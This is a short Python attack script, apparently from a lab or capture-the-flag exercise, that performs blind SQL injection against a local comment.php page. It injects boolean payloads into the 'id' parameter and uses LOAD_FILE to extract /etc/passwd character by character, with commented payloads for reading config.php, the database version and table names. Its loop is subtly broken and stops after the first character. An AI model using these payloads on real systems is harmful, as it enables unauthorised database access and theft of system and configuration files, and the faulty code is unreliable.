#! /usr/bin/python3

import requests
import sys

from tools import *
from payloads import *



#payload = " AND SUBSTRING(LOAD_FILE({}),0,1)!={}".format(
#	encode_str('config.php'),
#	encode_str('<'))


def count_payload(i):
	return "OR (SELECT command FROM job)=1 OR 1=1"


def test(payload):
	r = requests.get('http://127.0.0.1:8181/comment.php', params={'id':'1 {}'.format(payload)}, verify=False)
	print('[*] {} => {}'.format(payload, 'admin' not in r.text))	
	#print(r.request.url)
	return 'admin' not in r.text


def read_file(file):
	index = 1
	str = ''
	while True:
		for c in range(20,127):
			if(test(file_char_at_index(file,c, index))):
				str += chr(c)
				print(str)
				break
		print(str)
		break			
		index = index + 1


# print(read_string("(SELECT table_name FROM information_schema.tables ORDER BY table_name LIMIT 1 OFFSET 6)"))

# print(read_string("(SELECT version())"))

#print(test( "AND hex(SUBSTRING(LOAD_FILE({}),{},1))={}".format(
#		encode_str('/etc/passwd'), 1, 72)))

# print(test("UNION ALL SELECT 1 as cmd"))

read_file('/etc/passwd')

#print(test(file_exists('/etc/passwd')))

#print(test(fl_equal('/etc/passwd', 1386)))

#print(test(file_exists('/usr/share/nginx/www/config.php')))



